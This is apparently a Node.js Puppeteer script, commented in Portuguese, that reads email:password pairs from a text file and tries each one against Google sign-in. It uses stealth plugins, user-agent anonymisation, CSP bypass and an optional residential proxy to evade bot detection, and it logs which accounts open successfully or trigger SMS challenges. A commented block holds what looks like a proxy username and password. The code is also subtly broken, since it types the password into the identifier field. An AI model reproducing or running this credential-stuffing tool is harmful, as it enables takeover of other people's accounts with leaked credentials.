const puppeteer = require("puppeteer-extra");
StealthPlugin = require("puppeteer-extra-plugin-stealth");
const AnonymizeUAPlugin = require("puppeteer-extra-plugin-anonymize-ua");

const path = require("path");
const fs = require('fs');

const AdblockerPlugin = require("puppeteer-extra-plugin-adblocker");

puppeteer.use(AnonymizeUAPlugin());
puppeteer.use(
    AdblockerPlugin({
        blockTrackers: true,
    })
);

async function crawler(email, senha) {
    const browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        ignoreDefaultArgs: ["--disable-extensions"],
        args: [
            '--disable-blink-features=AutomationControlled',
            '--window-size=800,600',
            '--window-position=1921,0',
            '--incognito',
            //'--proxy-server=la.residential.rayobyte.com:8000',
            //  "--start-maximized",
            //  "--no-sandbox",
            //  "--disable-setuid-sandbox",
            //  "--user-data-dir=F:\\data",
            //  '--enable-automation', '--disable-extensions', '--disable-default-apps', '--disable-component-extensions-with-background-pages'
        ],
    });
    const page = await browser.newPage();

    /*await page.authenticate({        
        username: 'succxulicorbernal_gmail_com',
        password: 'tq45WY2ZlZGoJ'
    })*/


    await page.setBypassCSP(true);
    let login_link = "https://accounts.google.com/v3/signin/identifier?hl=en-gb&ifkv=ARZ0qKJXKmNU4Yds7fgJdItpqRt-iuh0xEt9dshiUg_sEKfmE2JOf6UaPeSbl5sU4omPij5Xo43CKg&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1";
    await page.goto(login_link);


    await page.waitForSelector('input[name="identifier"]');
    await page.type('input[name="identifier"]', email);
    await page.click('#identifierNext > div > button > span');
    await page.waitForSelector('input[name="identifier"]');

    await new Promise(function (resolve) { setTimeout(resolve, 5000) });
    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/recaptcha?')) {
        await new Promise(function (resolve) { setTimeout(resolve, 10000) });
        console.log('pediu captch' + email);
    }

    await page.waitForSelector('#passwordNext > div > button > span');
    await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    await page.type('input[name="identifier"]', senha);
    await page.click('#passwordNext > div > button > span');
    await new Promise(function (resolve) { setTimeout(resolve, 10000) });

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS: ' + email);
    } else {
        if (page.url().includes('https://myaccount.google.com/')) {
            console.log('FUNCIONOU: ' + email);
        } else { console.log(page.url()); }
    }
    await browser.close();
}


async function TestarEmail() {
    fs.readFile('emailtestar.txt', 'utf8', async (err, data) => {
        if (err) {
            console.error('Erro ao ler o arquivo:', err);
            return;
        }


        // Dividir as linhas em um array
        const linhas = data.split('\n');

        await percorrerLista(linhas);
    });
}

async function percorrerLista(lista) {
    for (const item of lista) {
        const [email, senha] = item.split(':');
        // Aqui você pode fazer o que quiser com os valores de email e senha
        if (email.trim() == '') {
            return;
        }
        //console.log('testando:', email);
        await crawler(email, senha);
    }
    console.log('Todos os itens foram processados.');
}

// Chamar a função passando o nome do arquivo como argumento
TestarEmail();

